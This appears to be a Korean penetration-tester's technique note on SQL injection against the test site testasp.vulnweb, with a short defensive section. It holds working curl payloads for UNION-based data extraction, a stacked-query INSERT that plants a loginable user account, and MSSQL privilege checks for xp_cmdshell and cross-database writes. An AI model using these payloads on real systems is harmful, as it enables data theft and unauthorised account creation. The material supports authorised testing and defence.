# SQL Injection — 추가 케이스 (UNION 열수 오라클 · 스택드 DML · 권한 오라클)

> 기존 초안(`동일 대상의 기존 초안/sql-injection.md`)과 **같은 파일명**이다 →
> 승격 시 그 문서에 **아래 케이스만 병합**하는 것이 목적이다(중복 케이스는 "재확인" 줄로만 남긴다).

## 재확인된 사례: `testasp-vulnweb-jev-trial`

기존 문서의 케이스가 같은 대상에서 그대로 재현됨 —
기존 케이스 A(본문 차이 boolean, 검색 파라미터) · B(상태코드 차이 boolean, 숫자형 id) ·
C(서브쿼리 오라클) · D(INSERT 값 목록) · E(스택드 가능 여부).
추가로 확인된 두 가지 환경 특성:

- **오류 기반 불가**: 500 응답이 커스텀/IIS 기본 페이지(고정 크기)라 SQL 오류문이 노출되지 않는다.
  → "조건 거짓(500)" 과 "문법 오류(500)" 를 상태코드로 구분할 수 없다 ⇒ **모든 판정은 `(1=1)/(1=2)` 쌍 + 정상 입력 대조군**으로만.
- **같은 파라미터가 여러 쿼리에 재사용되는 지점은 UNION 불가**: `id` 가 2~5개 쿼리에 들어가면
  열수 정합을 맞출 수 없다(모두 500). 이 경우 해당 지점은 **blind/시간차 전용**으로 확정하고,
  UNION 은 **단일 쿼리 + 결과 렌더** 지점(검색 등)에서 시도한다.

---

## 신규 케이스 F — UNION 열수 오라클 + 1요청 데이터 열람 ★

**상황**: 검색 파라미터가 단일 쿼리의 `WHERE` 조건식에 결합되고, 결과가 본문에 렌더된다.

**열수를 먼저 확정한다**(이게 핵심 — 감으로 늘리지 않는다):

```bash
# 원본 조건을 닫고 UNION ALL 로 열을 맞춰 붙인다. 3열/9열/… 로 늘려가며 500 이 사라지는 열수를 찾는다
curl -s -G --data-urlencode "q=zzq')>0) UNION ALL SELECT 1,2,3,4,5,6,7,8,9--"      "http://<target>/Search.asp"   # → 500 (열수 불일치)
curl -s -G --data-urlencode "q=zzq')>0) UNION ALL SELECT 1,'A',0,0,0,0,GETDATE(),'','',''--" "http://<target>/Search.asp"   # → 200 (10열 = 정답)
```

정답 열수가 정해지면 **1요청으로 원하는 값**을 문자열로 렌더시킨다:

```bash
curl -s -G --data-urlencode "q=zzq')>0) UNION ALL SELECT 1,'V='+DB_NAME(),0,0,0,0,GETDATE(),'','',''--" "http://<target>/Search.asp" | grep -o 'V=[A-Za-z0-9_]*'

# 한 요청에 여러 값을 마커로 묶으면 왕복을 줄일 수 있다(버전·계정·행수 동시)
curl -s -G --data-urlencode "q=zzq')>0) UNION ALL SELECT 1,'VER='+LEFT(@@version,40),'U='+SUSER_NAME(),'N='+CAST((SELECT COUNT(*) FROM users) AS varchar),0,0,GETDATE(),'','',''--" "http://<target>/Search.asp"
```

**왜 강한가**: boolean/시간차는 비트 단위 추출이라 수십~수백 요청이 필요하지만,
UNION 은 **1요청 = 임의 SELECT 결과 전체**다. 열수만 맞추면 스키마·버전·계정·임의 컬럼을 즉시 얻는다.

**함정**
- 원본 조건식을 **온전히 닫아야** 한다(위 예: `zzq')>0)`). 조각만 넣으면 문법 오류로 500 이 나고,
  그 500 을 "열수 틀림"으로 오독해 열수를 계속 늘리며 헤매게 된다 → **500 의 두 원인(문법/열수)을 구분**한다.
- 문자열 결합 함수는 DB 별 문법이 다르다(MSSQL `+`, MySQL `CONCAT`/`||`). 틀리면 500 → 대조군으로 검증.
- 열수 확정은 **바이너리 서치**로: 1,2,4,8,16 … 처럼 넓혔다가 좁히면 왕복이 크게 준다.
- UNION 결과가 **HTML 인코딩**되어도 값은 읽힌다(엔코딩은 무해 — 오히려 원문이 그대로 남는다).

## 신규 케이스 G — 스택드 쿼리로 **GET 한 방에 임의 DML** (쓰기 원시능력) ★

**상황**: 숫자형 `id` 파라미터가 문자열 결합되고, 해당 DB 계정에 쓰기 권한이 있다.

```bash
# id 를 닫고 세미콜론으로 새 명령을 붙인다. GET 요청 하나로 INSERT 가 실행된다.
curl -s -o /dev/null -G --data-urlencode \
  "id=0;INSERT INTO users (uname,upass,email,realname,avatar) VALUES('zz_probe','<pw>','p@example.com','probe','')--" \
  "http://<target>/showforum.asp"
```

**검증 프로토콜(반드시 이 순서)**
1. 삽입 **전에** 같은 값을 조회해 없음을 확인(대조군)
2. 스택드 INSERT 실행
3. UNION/직접 조회로 **행이 실제로 생겼는지** 확인(응답 코드가 아니라 행 내용으로)
4. 그 자격증명으로 **정상 로그인**까지 성공시키면 "실사용 가능한 데이터가 만들어졌다"는 최강 증거가 된다
5. 생성한 행의 식별자(계정명 등)를 일지에 남겨 **추적·정리 가능**하게 한다 — DELETE 권한이 없으면 되돌릴 수 없다

**⚠️ 파괴적 분기 경고(이 대상에서 실측)**: 게시판 코드 일부는
`if total > 100 then DELETE FROM posts WHERE threadid=<id>` 같은 **자체 정리 로직**을 갖고 있었다.
즉 **POST 경로의 `id` 에 페이로드를 넣으면 데이터가 삭제될 수 있다** → 쓰기 주입은
① GET 경로에서, ② `id` 대신 안전한 파라미터에서, ③ 사전에 소스로 분기 조건을 확인한 뒤에만 한다.
(소스 유출이 가능한 대상이면 **공격 전에 소스를 읽어 파괴적 분기를 먼저 찾는 것**이 원칙이다.)

## 신규 케이스 H — **권한/상한 오라클**: RCE 가능성과 교차 DB 권한을 읽기 전용으로 판정 ★

**상황**: SQLi 로 쿼리 제어는 되지만, "여기서 어디까지 가능한가"를 **실행 없이** 판정해야 한다
(실행해보고 판단하면 그 자체가 위험한 행위가 된다). MSSQL 기준 오라클 세트:

```bash
curl -s -G --data-urlencode "q=zzq')>0) UNION ALL SELECT 1,
   'SYSADMIN='+ISNULL(CAST(IS_SRVROLEMEMBER('sysadmin') AS varchar),'N'),
   'XPCMD='   +ISNULL(CAST((SELECT TOP 1 value_in_use FROM sys.configurations WHERE name='xp_cmdshell') AS varchar),'N'),
   'CTRL='    +ISNULL(CAST(HAS_PERMS_BY_NAME(NULL,NULL,'CONTROL SERVER') AS varchar),'N'),
   'ALTERDB=' +ISNULL(CAST(HAS_PERMS_BY_NAME(NULL,NULL,'ALTER ANY DATABASE') AS varchar),'N'),
   'BULK='    +ISNULL(CAST(HAS_PERMS_BY_NAME(NULL,NULL,'BULK OPERATIONS') AS varchar),'N'),
   'UPD1='    +ISNULL(CAST(HAS_PERMS_BY_NAME('<db>.dbo.<table>','OBJECT','UPDATE') AS varchar),'N'),
   'UPD2='    +ISNULL(CAST(HAS_PERMS_BY_NAME('<다른DB>.dbo.<table>','OBJECT','UPDATE') AS varchar),'N')--" \
   "http://<target>/Search.asp"
```

**읽는 법**
- `SYSADMIN=0` + `XPCMD=0` + `CTRL=0` → **OS 명령 실행 경로 없음**(RCE 불가로 확정). 셋 다 0 이면 굳이 `xp_cmdshell` 실행을 시도할 이유가 없다.
- `BULK=NULL`, `ALTERDB=0` → 파일 읽기/스키마 변경도 불가.
- `HAS_PERMS_BY_NAME` 은 **객체별 권한**을 알려주므로, `<다른DB>` 류 **다른 DB 객체에 UPDATE=1** 이 뜨면
  "교차 DB 쓰기 가능"이지만 **다른 애플리케이션의 데이터**이므로 실행하지 않고 권한만 기록한다.
- `IS_SRVROLEMEMBER('db_owner')` 같이 **서버 역할이 아닌 값을 넣으면 NULL** 이 돌아온다 → NULL 을 "0/거짓"으로 오독하지 않는다.
- 이 오라클들은 전부 **읽기 전용**이라 안전하며, 보고서에는 "왜 RCE 가 불가능한지"의 근거로 쓴다.

## 방어 관점(추가분)

- 쓰기(INSERT/UPDATE/DELETE) 권한을 **웹 애플리케이션 계정에서 최소화**한다(교차 DB 접근 권한 제거).
- `xp_cmdshell` 등 위험 기능은 비활성 유지(설정 `value_in_use=0` 을 실제로 확인).
- 게시판 자동 정리 로직(`total>100 → DELETE`) 같은 **데이터 파괴 분기에 상한·승인 절차**를 둔다.
- 사용자에게 노출되는 오류는 통일하되, **서버 로그**에는 원인을 남긴다(오류 은닉이 진단을 막는 역효과 방지).

<!-- 출처: journal/web/testasp-vulnweb-jev-trial/, Round 2 · Round 3 · Round 4 -->
